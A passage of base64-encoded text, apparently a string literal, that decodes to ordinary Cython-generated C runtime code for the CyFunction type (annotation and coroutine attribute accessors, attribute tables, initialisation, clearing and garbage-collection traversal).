GV4dCk7CiAgICBpZiAoIXZhbHVlIHx8IHZhbHVlID09IFB5X05vbmUpIHsKICAgICAgICB2YWx1ZSA9IE5VTEw7CiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KCFQeURpY3RfQ2hlY2sodmFsdWUpKSkgewogICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAgICAgICAgICJfX2Fubm90YXRpb25zX18gbXVzdCBiZSBzZXQgdG8gYSBkaWN0IG9iamVjdCIpOwogICAgICAgIHJldHVybiAtMTsKICAgIH0KICAgIFB5X1hJTkNSRUYodmFsdWUpOwogICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihvcCk7CiAgICBfX1B5eF9QeV9YREVDUkVGX1NFVChvcC0+ZnVuY19hbm5vdGF0aW9ucywgdmFsdWUpOwogICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTsKICAgIHJldHVybiAwOwp9CnN0YXRpYyBQeU9iamVjdCAqCl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2Fubm90YXRpb25zX2xvY2tlZChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCkgewogICAgUHlPYmplY3QqIHJlc3VsdCA9IG9wLT5mdW5jX2Fubm90YXRpb25zOwogICAgaWYgKHVubGlrZWx5KCFyZXN1bHQpKSB7CiAgICAgICAgcmVzdWx0ID0gUHlEaWN0X05ldygpOwogICAgICAgIGlmICh1bmxpa2VseSghcmVzdWx0KSkgcmV0dXJuIE5VTEw7CiAgICAgICAgb3AtPmZ1bmNfYW5ub3RhdGlvbnMgPSByZXN1bHQ7CiAgICB9CiAgICBQeV9JTkNSRUYocmVzdWx0KTsKICAgIHJldHVybiByZXN1bHQ7Cn0Kc3RhdGljIFB5T2JqZWN0ICoKX19QeXhfQ3lGdW5jdGlvbl9nZXRfYW5ub3RhdGlvbnMoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIHZvaWQgKmNvbnRleHQpIHsKICAgIFB5T2JqZWN0ICpyZXN1bHQ7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTsKICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApOwogICAgcmVzdWx0ID0gX19QeXhfQ3lGdW5jdGlvbl9nZXRfYW5ub3RhdGlvbnNfbG9ja2VkKG9wKTsKICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7CiAgICByZXR1cm4gcmVzdWx0Owp9CnN0YXRpYyBQeU9iamVjdCAqCl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2lz""X2Nvcm91dGluZV92YWx1ZShfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCkgewogICAgaW50IGlzX2Nvcm91dGluZSA9IG9wLT5mbGFncyAmIF9fUHl4X0NZRlVOQ1RJT05fQ09ST1VUSU5FOwogICAgaWYgKGlzX2Nvcm91dGluZSkgewogICAgICAgIFB5T2JqZWN0ICppc19jb3JvdXRpbmVfdmFsdWUsICptb2R1bGUsICpmcm9tbGlzdCwgKm1hcmtlciA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pc19jb3JvdXRpbmU7CiAgICAgICAgZnJvbWxpc3QgPSBQeUxpc3RfTmV3KDEpOwogICAgICAgIGlmICh1bmxpa2VseSghZnJvbWxpc3QpKSByZXR1cm4gTlVMTDsKICAgICAgICBQeV9JTkNSRUYobWFya2VyKTsKI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MKICAgICAgICBQeUxpc3RfU0VUX0lURU0oZnJvbWxpc3QsIDAsIG1hcmtlcik7CiNlbHNlCiAgICAgICAgaWYgKHVubGlrZWx5KFB5TGlzdF9TZXRJdGVtKGZyb21saXN0LCAwLCBtYXJrZXIpIDwgMCkpIHsKICAgICAgICAgICAgUHlfREVDUkVGKG1hcmtlcik7CiAgICAgICAgICAgIFB5X0RFQ1JFRihmcm9tbGlzdCk7CiAgICAgICAgICAgIHJldHVybiBOVUxMOwogICAgICAgIH0KI2VuZGlmCiAgICAgICAgbW9kdWxlID0gUHlJbXBvcnRfSW1wb3J0TW9kdWxlTGV2ZWxPYmplY3QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2FzeW5jaW9fY29yb3V0aW5lcywgTlVMTCwgTlVMTCwgZnJvbWxpc3QsIDApOwogICAgICAgIFB5X0RFQ1JFRihmcm9tbGlzdCk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFtb2R1bGUpKSBnb3RvIGlnbm9yZTsKICAgICAgICBpc19jb3JvdXRpbmVfdmFsdWUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKG1vZHVsZSwgbWFya2VyKTsKICAgICAgICBQeV9ERUNSRUYobW9kdWxlKTsKICAgICAgICBpZiAobGlrZWx5KGlzX2Nvcm91dGluZV92YWx1ZSkpIHsKICAgICAgICAgICAgcmV0dXJuIGlzX2Nvcm91dGluZV92YWx1ZTsKICAgICAgICB9Cmlnbm9yZToKICAgICAgICBQeUVycl9DbGVhcigpOwogICAgfQogICAgcmV0dXJuIF9fUHl4X1B5Qm9vbF9Gcm9tTG9uZyhpc19jb3JvdXRpbmUpOwp9CnN0YXRpYyBQeU9iamVjdCAqCl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2lzX2Nvcm91dGluZShfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgdm9pZCAqY29udGV4dCkgewogICAgUHlPYmplY3QgKnJlc3VsdDsKICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpOwogICAgaWYgKG9wLT5mdW5jX2lzX2Nvcm91dGluZSkgewogICAgICAgIHJldHVybiBfX1B5eF9OZXdSZWYob3AtPmZ1bmNfaXNfY29yb3V0aW5lKTsKICAgIH0KICAgIHJlc3VsdCA9IF9fUHl4X0N5RnVuY3Rpb25fZ2V0X2lzX2Nvcm91dGluZV92YWx1ZShvcCk7CiAgICBpZiAodW5saWtlbHkoIXJlc3VsdCkpCiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTsKICAgIGlmIChvcC0+ZnVuY19pc19jb3JvdXRpbmUp""IHsKICAgICAgICBQeV9ERUNSRUYocmVzdWx0KTsKICAgICAgICByZXN1bHQgPSBfX1B5eF9OZXdSZWYob3AtPmZ1bmNfaXNfY29yb3V0aW5lKTsKICAgIH0gZWxzZSB7CiAgICAgICAgb3AtPmZ1bmNfaXNfY29yb3V0aW5lID0gX19QeXhfTmV3UmVmKHJlc3VsdCk7CiAgICB9CiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpOwogICAgcmV0dXJuIHJlc3VsdDsKfQpzdGF0aWMgdm9pZCBfX1B5eF9DeUZ1bmN0aW9uX3JhaXNlX2FyZ3VtZW50X2NvdW50X2Vycm9yKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKmZ1bmMsIGNvbnN0IGNoYXIqIG1lc3NhZ2UsIFB5X3NzaXplX3Qgc2l6ZSkgewojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgUHlPYmplY3QgKnB5X25hbWUgPSBfX1B5eF9DeUZ1bmN0aW9uX2dldF9uYW1lKGZ1bmMsIE5VTEwpOwogICAgaWYgKCFweV9uYW1lKSByZXR1cm47CiAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLAogICAgICAgICIlLjIwMFMoKSAlcyAoJSIgQ1lUSE9OX0ZPUk1BVF9TU0laRV9UICJkIGdpdmVuKSIsCiAgICAgICAgcHlfbmFtZSwgbWVzc2FnZSwgc2l6ZSk7CiAgICBQeV9ERUNSRUYocHlfbmFtZSk7CiNlbHNlCiAgICBjb25zdCBjaGFyKiBuYW1lID0gKChQeUNGdW5jdGlvbk9iamVjdCopZnVuYyktPm1fbWwtPm1sX25hbWU7CiAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLAogICAgICAgICIlLjIwMHMoKSAlcyAoJSIgQ1lUSE9OX0ZPUk1BVF9TU0laRV9UICJkIGdpdmVuKSIsCiAgICAgICAgbmFtZSwgbWVzc2FnZSwgc2l6ZSk7CiNlbmRpZgp9CnN0YXRpYyB2b2lkIF9fUHl4X0N5RnVuY3Rpb25fcmFpc2VfdHlwZV9lcnJvcihfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpmdW5jLCBjb25zdCBjaGFyKiBtZXNzYWdlKSB7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBQeU9iamVjdCAqcHlfbmFtZSA9IF9fUHl4X0N5RnVuY3Rpb25fZ2V0X25hbWUoZnVuYywgTlVMTCk7CiAgICBpZiAoIXB5X25hbWUpIHJldHVybjsKICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgIiUuMjAwUygpICVzIiwKICAgICAgICBweV9uYW1lLCBtZXNzYWdlKTsKICAgIFB5X0RFQ1JFRihweV9uYW1lKTsKI2Vsc2UKICAgIGNvbnN0IGNoYXIqIG5hbWUgPSAoKFB5Q0Z1bmN0aW9uT2JqZWN0KilmdW5jKS0+bV9tbC0+bWxfbmFtZTsKICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgIiUuMjAwcygpICVzIiwKICAgICAgICBuYW1lLCBtZXNzYWdlKTsKI2VuZGlmCn0KI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKc3RhdGljIFB5T2JqZWN0ICoKX19QeXhfQ3lGdW5jdGlvbl9nZXRfbW9kdWxlKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCB2b2lkICpjb250ZXh0KSB7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTsKICAgIHJldHVybiBQeU9iamVjdF9HZXRBdHRyU3Ry""aW5nKG9wLT5mdW5jLCAiX19tb2R1bGVfXyIpOwp9CnN0YXRpYyBpbnQKX19QeXhfQ3lGdW5jdGlvbl9zZXRfbW9kdWxlKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCBQeU9iamVjdCogdmFsdWUsIHZvaWQgKmNvbnRleHQpIHsKICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpOwogICAgcmV0dXJuIFB5T2JqZWN0X1NldEF0dHJTdHJpbmcob3AtPmZ1bmMsICJfX21vZHVsZV9fIiwgdmFsdWUpOwp9CiNlbmRpZgpzdGF0aWMgUHlHZXRTZXREZWYgX19weXhfQ3lGdW5jdGlvbl9nZXRzZXRzW10gPSB7CiAgICB7ImZ1bmNfZG9jIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9kb2MsIChzZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9zZXRfZG9jLCAwLCAwfSwKICAgIHsiX19kb2NfXyIsICAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X2RvYywgKHNldHRlcilfX1B5eF9DeUZ1bmN0aW9uX3NldF9kb2MsIDAsIDB9LAogICAgeyJmdW5jX25hbWUiLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X25hbWUsIChzZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9zZXRfbmFtZSwgMCwgMH0sCiAgICB7Il9fbmFtZV9fIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9uYW1lLCAoc2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fc2V0X25hbWUsIDAsIDB9LAogICAgeyJfX3F1YWxuYW1lX18iLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X3F1YWxuYW1lLCAoc2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fc2V0X3F1YWxuYW1lLCAwLCAwfSwKICAgIHsiZnVuY19kaWN0IiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9kaWN0LCAoc2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fc2V0X2RpY3QsIDAsIDB9LAogICAgeyJfX2RpY3RfXyIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfZGljdCwgKHNldHRlcilfX1B5eF9DeUZ1bmN0aW9uX3NldF9kaWN0LCAwLCAwfSwKICAgIHsiZnVuY19nbG9iYWxzIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9nbG9iYWxzLCAwLCAwLCAwfSwKICAgIHsiX19nbG9iYWxzX18iLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X2dsb2JhbHMsIDAsIDAsIDB9LAogICAgeyJmdW5jX2Nsb3N1cmUiLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X2Nsb3N1cmUsIDAsIDAsIDB9LAogICAgeyJfX2Nsb3N1cmVfXyIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfY2xvc3VyZSwgMCwgMCwgMH0sCiAgICB7ImZ1bmNfY29kZSIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfY29kZSwgMCwgMCwgMH0sCiAgICB7Il9fY29kZV9fIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9jb2RlLCAwLCAwLCAwfSwKICAgIHsiZnVuY19kZWZhdWx0cyIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfZGVmYXVsdHMsIChzZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9zZXRfZGVmYXVsdHMsIDAsIDB9LAogICAgeyJfX2RlZmF1bHRzX18iLCAoZ2V0dGVyKV9fUHl4X0N5""RnVuY3Rpb25fZ2V0X2RlZmF1bHRzLCAoc2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fc2V0X2RlZmF1bHRzLCAwLCAwfSwKICAgIHsiX19rd2RlZmF1bHRzX18iLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X2t3ZGVmYXVsdHMsIChzZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9zZXRfa3dkZWZhdWx0cywgMCwgMH0sCiAgICB7Il9fYW5ub3RhdGlvbnNfXyIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfYW5ub3RhdGlvbnMsIChzZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9zZXRfYW5ub3RhdGlvbnMsIDAsIDB9LAogICAgeyJfaXNfY29yb3V0aW5lIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9pc19jb3JvdXRpbmUsIDAsIDAsIDB9LAojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgeyJfX21vZHVsZV9fIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9tb2R1bGUsIChzZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9zZXRfbW9kdWxlLCAwLCAwfSwKI2VuZGlmCiAgICB7MCwgMCwgMCwgMCwgMH0KfTsKc3RhdGljIFB5TWVtYmVyRGVmIF9fcHl4X0N5RnVuY3Rpb25fbWVtYmVyc1tdID0gewojaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIHsiX19tb2R1bGVfXyIsIFRfT0JKRUNULCBvZmZzZXRvZihQeUNGdW5jdGlvbk9iamVjdCwgbV9tb2R1bGUpLCAwLCAwfSwKI2VuZGlmCiAgICB7Il9fZGljdG9mZnNldF9fIiwgVF9QWVNTSVpFVCwgb2Zmc2V0b2YoX19weXhfQ3lGdW5jdGlvbk9iamVjdCwgZnVuY19kaWN0KSwgUkVBRE9OTFksIDB9LAojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKI2lmIENZVEhPTl9CQUNLUE9SVF9WRUNUT1JDQUxMIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIHsiX192ZWN0b3JjYWxsb2Zmc2V0X18iLCBUX1BZU1NJWkVULCBvZmZzZXRvZihfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0LCBmdW5jX3ZlY3RvcmNhbGwpLCBSRUFET05MWSwgMH0sCiNlbHNlCiAgICB7Il9fdmVjdG9yY2FsbG9mZnNldF9fIiwgVF9QWVNTSVpFVCwgb2Zmc2V0b2YoUHlDRnVuY3Rpb25PYmplY3QsIHZlY3RvcmNhbGwpLCBSRUFET05MWSwgMH0sCiNlbmRpZgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgeyJfX3dlYWtsaXN0b2Zmc2V0X18iLCBUX1BZU1NJWkVULCBvZmZzZXRvZihfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0LCBmdW5jX3dlYWtyZWZsaXN0KSwgUkVBRE9OTFksIDB9LAojZWxzZQogICAgeyJfX3dlYWtsaXN0b2Zmc2V0X18iLCBUX1BZU1NJWkVULCBvZmZzZXRvZihQeUNGdW5jdGlvbk9iamVjdCwgbV93ZWFrcmVmbGlzdCksIFJFQURPTkxZLCAwfSwKI2VuZGlmCiNlbmRpZgogICAgezAsIDAsIDAsICAwLCAwfQp9OwpzdGF0aWMgUHlPYmplY3QgKgpfX1B5eF9DeUZ1bmN0aW9uX3JlZHVjZShfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICptLCBQeU9iamVjdCAqYXJncykKewogICAgUHlPYmplY3QgKnJlc3VsdCA9IE5V""TEw7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihhcmdzKTsKICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04obSk7CiAgICBQeV9JTkNSRUYobS0+ZnVuY19xdWFsbmFtZSk7CiAgICByZXN1bHQgPSBtLT5mdW5jX3F1YWxuYW1lOwogICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTsKICAgIHJldHVybiByZXN1bHQ7Cn0Kc3RhdGljIFB5TWV0aG9kRGVmIF9fcHl4X0N5RnVuY3Rpb25fbWV0aG9kc1tdID0gewogICAgeyJfX3JlZHVjZV9fIiwgKFB5Q0Z1bmN0aW9uKV9fUHl4X0N5RnVuY3Rpb25fcmVkdWNlLCBNRVRIX1ZBUkFSR1MsIDB9LAogICAgezAsIDAsIDAsIDB9Cn07CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiNkZWZpbmUgX19QeXhfQ3lGdW5jdGlvbl93ZWFrcmVmbGlzdChjeWZ1bmMpICgoY3lmdW5jKS0+ZnVuY193ZWFrcmVmbGlzdCkKI2Vsc2UKI2RlZmluZSBfX1B5eF9DeUZ1bmN0aW9uX3dlYWtyZWZsaXN0KGN5ZnVuYykgKCgoUHlDRnVuY3Rpb25PYmplY3QqKWN5ZnVuYyktPm1fd2Vha3JlZmxpc3QpCiNlbmRpZgpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0N5RnVuY3Rpb25fSW5pdChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgUHlNZXRob2REZWYgKm1sLCBpbnQgZmxhZ3MsIFB5T2JqZWN0KiBxdWFsbmFtZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmNsb3N1cmUsIFB5T2JqZWN0ICptb2R1bGUsIFB5T2JqZWN0KiBnbG9iYWxzLCBQeU9iamVjdCogY29kZSkgewojaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIFB5Q0Z1bmN0aW9uT2JqZWN0ICpjZiA9IChQeUNGdW5jdGlvbk9iamVjdCopIG9wOwojZW5kaWYKICAgIGlmICh1bmxpa2VseShvcCA9PSBOVUxMKSkKICAgICAgICByZXR1cm4gTlVMTDsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIG9wLT5mdW5jID0gUHlDRnVuY3Rpb25fTmV3RXgobWwsIChQeU9iamVjdCopb3AsIG1vZHVsZSk7CiAgICBpZiAodW5saWtlbHkoIW9wLT5mdW5jKSkgcmV0dXJuIE5VTEw7CiNlbmRpZgogICAgb3AtPmZsYWdzID0gZmxhZ3M7CiAgICBfX1B5eF9DeUZ1bmN0aW9uX3dlYWtyZWZsaXN0KG9wKSA9IE5VTEw7CiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgY2YtPm1fbWwgPSBtbDsKICAgIGNmLT5tX3NlbGYgPSAoUHlPYmplY3QgKikgb3A7CiNlbmRpZgogICAgUHlfWElOQ1JFRihjbG9zdXJlKTsKICAgIG9wLT5mdW5jX2Nsb3N1cmUgPSBjbG9zdXJlOwojaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIFB5X1hJTkNSRUYobW9kdWxlKTsKICAgIGNmLT5tX21vZHVsZSA9IG1vZHVsZTsKI2VuZGlmCiAgICBvcC0+ZnVuY19kaWN0ID0gTlVMTDsKICAgIG9wLT5mdW5jX25hbWUgPSBOVUxMOwogICAgUHlfSU5DUkVGKHF1YWxuYW1lKTsKICAgIG9wLT5mdW5jX3F1YWxuYW1lID0gcXVhbG5hbWU7CiAg""ICBvcC0+ZnVuY19kb2MgPSBOVUxMOwojaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDkwMEIxIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIG9wLT5mdW5jX2NsYXNzb2JqID0gTlVMTDsKI2Vsc2UKICAgICgoUHlDTWV0aG9kT2JqZWN0KilvcCktPm1tX2NsYXNzID0gTlVMTDsKI2VuZGlmCiAgICBvcC0+ZnVuY19nbG9iYWxzID0gZ2xvYmFsczsKICAgIFB5X0lOQ1JFRihvcC0+ZnVuY19nbG9iYWxzKTsKICAgIFB5X1hJTkNSRUYoY29kZSk7CiAgICBvcC0+ZnVuY19jb2RlID0gY29kZTsKICAgIG9wLT5kZWZhdWx0cyA9IE5VTEw7CiAgICBvcC0+ZGVmYXVsdHNfdHVwbGUgPSBOVUxMOwogICAgb3AtPmRlZmF1bHRzX2t3ZGljdCA9IE5VTEw7CiAgICBvcC0+ZGVmYXVsdHNfZ2V0dGVyID0gTlVMTDsKICAgIG9wLT5mdW5jX2Fubm90YXRpb25zID0gTlVMTDsKICAgIG9wLT5mdW5jX2lzX2Nvcm91dGluZSA9IE5VTEw7CiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTAogICAgc3dpdGNoIChtbC0+bWxfZmxhZ3MgJiAoTUVUSF9WQVJBUkdTIHwgTUVUSF9GQVNUQ0FMTCB8IE1FVEhfTk9BUkdTIHwgTUVUSF9PIHwgTUVUSF9LRVlXT1JEUyB8IE1FVEhfTUVUSE9EKSkgewogICAgY2FzZSBNRVRIX05PQVJHUzoKICAgICAgICBfX1B5eF9DeUZ1bmN0aW9uX2Z1bmNfdmVjdG9yY2FsbChvcCkgPSBfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfTk9BUkdTOwogICAgICAgIGJyZWFrOwogICAgY2FzZSBNRVRIX086CiAgICAgICAgX19QeXhfQ3lGdW5jdGlvbl9mdW5jX3ZlY3RvcmNhbGwob3ApID0gX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX087CiAgICAgICAgYnJlYWs7CiAgICBjYXNlIE1FVEhfTUVUSE9EIHwgTUVUSF9GQVNUQ0FMTCB8IE1FVEhfS0VZV09SRFM6CiAgICAgICAgX19QeXhfQ3lGdW5jdGlvbl9mdW5jX3ZlY3RvcmNhbGwob3ApID0gX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX0ZBU1RDQUxMX0tFWVdPUkRTX01FVEhPRDsKICAgICAgICBicmVhazsKICAgIGNhc2UgTUVUSF9GQVNUQ0FMTCB8IE1FVEhfS0VZV09SRFM6CiAgICAgICAgX19QeXhfQ3lGdW5jdGlvbl9mdW5jX3ZlY3RvcmNhbGwob3ApID0gX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX0ZBU1RDQUxMX0tFWVdPUkRTOwogICAgICAgIGJyZWFrOwogICAgY2FzZSBNRVRIX1ZBUkFSR1MgfCBNRVRIX0tFWVdPUkRTOgogICAgICAgIF9fUHl4X0N5RnVuY3Rpb25fZnVuY192ZWN0b3JjYWxsKG9wKSA9IE5VTEw7CiAgICAgICAgYnJlYWs7CiAgICBkZWZhdWx0OgogICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19TeXN0ZW1FcnJvciwgIkJhZCBjYWxsIGZsYWdzIGZvciBDeUZ1bmN0aW9uIik7CiAgICAgICAgUHlfREVDUkVGKG9wKTsKICAgICAgICByZXR1cm4gTlVMTDsKICAgIH0KI2VuZGlmCiAgICByZXR1cm4gKFB5T2JqZWN0ICopIG9wOwp9CnN0YXRpYyBpbnQKX19QeXhfQ3lGdW5jdGlvbl9jbGVhcihfX3B5eF9DeUZ1bmN0aW9u""T2JqZWN0ICptKQp7CiAgICBQeV9DTEVBUihtLT5mdW5jX2Nsb3N1cmUpOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgUHlfQ0xFQVIobS0+ZnVuYyk7CiNlbHNlCiAgICBQeV9DTEVBUigoKFB5Q0Z1bmN0aW9uT2JqZWN0KiltKS0+bV9tb2R1bGUpOwojZW5kaWYKICAgIFB5X0NMRUFSKG0tPmZ1bmNfZGljdCk7CiAgICBQeV9DTEVBUihtLT5mdW5jX25hbWUpOwogICAgUHlfQ0xFQVIobS0+ZnVuY19xdWFsbmFtZSk7CiAgICBQeV9DTEVBUihtLT5mdW5jX2RvYyk7CiAgICBQeV9DTEVBUihtLT5mdW5jX2dsb2JhbHMpOwogICAgUHlfQ0xFQVIobS0+ZnVuY19jb2RlKTsKI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwQjEKICAgIFB5X0NMRUFSKF9fUHl4X0N5RnVuY3Rpb25fR2V0Q2xhc3NPYmoobSkpOwojZWxzZQogICAgewogICAgICAgIFB5T2JqZWN0ICpjbHMgPSAoUHlPYmplY3QqKSAoKFB5Q01ldGhvZE9iamVjdCAqKSAobSkpLT5tbV9jbGFzczsKICAgICAgICAoKFB5Q01ldGhvZE9iamVjdCAqKSAobSkpLT5tbV9jbGFzcyA9IE5VTEw7CiAgICAgICAgUHlfWERFQ1JFRihjbHMpOwogICAgfQojZW5kaWYKI2VuZGlmCiAgICBQeV9DTEVBUihtLT5kZWZhdWx0c190dXBsZSk7CiAgICBQeV9DTEVBUihtLT5kZWZhdWx0c19rd2RpY3QpOwogICAgUHlfQ0xFQVIobS0+ZnVuY19hbm5vdGF0aW9ucyk7CiAgICBQeV9DTEVBUihtLT5mdW5jX2lzX2Nvcm91dGluZSk7CiAgICBQeV9DTEVBUihtLT5kZWZhdWx0cyk7CiAgICByZXR1cm4gMDsKfQpzdGF0aWMgdm9pZCBfX1B5eF9fQ3lGdW5jdGlvbl9kZWFsbG9jKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm0pCnsKICAgIGlmIChfX1B5eF9DeUZ1bmN0aW9uX3dlYWtyZWZsaXN0KG0pICE9IE5VTEwpCiAgICAgICAgUHlPYmplY3RfQ2xlYXJXZWFrUmVmcygoUHlPYmplY3QgKikgbSk7CiAgICBfX1B5eF9DeUZ1bmN0aW9uX2NsZWFyKG0pOwogICAgX19QeXhfUHlIZWFwVHlwZU9iamVjdF9HQ19EZWwobSk7Cn0Kc3RhdGljIHZvaWQgX19QeXhfQ3lGdW5jdGlvbl9kZWFsbG9jKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm0pCnsKICAgIFB5T2JqZWN0X0dDX1VuVHJhY2sobSk7CiAgICBfX1B5eF9fQ3lGdW5jdGlvbl9kZWFsbG9jKG0pOwp9CnN0YXRpYyBpbnQgX19QeXhfQ3lGdW5jdGlvbl90cmF2ZXJzZShfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICptLCB2aXNpdHByb2MgdmlzaXQsIHZvaWQgKmFyZykKewogICAgewogICAgICAgIGludCBlID0gX19QeXhfY2FsbF90eXBlX3RyYXZlcnNlKChQeU9iamVjdCopbSwgMSwgdmlzaXQsIGFyZyk7CiAgICAgICAgaWYgKGUpIHJldHVybiBlOwogICAgfQogICAgUHlfVklTSVQobS0+ZnVuY19jbG9zdXJlKTsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIFB5X1ZJU0lUKG0tPmZ1bmMpOwojZWxzZQogICAgUHlfVklTSVQoKChQeUNG""dW5jdGlvbk9iamVjdCopbSktPm1fbW9kdWxlKTsKI2VuZGlmCiAgICBQeV9WSVNJVChtLT5mdW5jX2RpY3QpOwogICAgX19QeXhfVklTSVRfQ09OU1QobS0+ZnVuY19uYW1lKTsKICAgIF9fUHl4X1ZJU0lUX0NPTlNUKG0tPmZ1bmNfcXVhbG5hbWUpOwogICAgUHlfVklTSVQobS0+ZnVuY19kb2MpOwogICAgUHlfVklTSVQobS0+ZnVuY19nbG9iYWxzKTsKICAgIF9fUHl4X1ZJU0lUX0NPTlNUKG0tPmZ1bm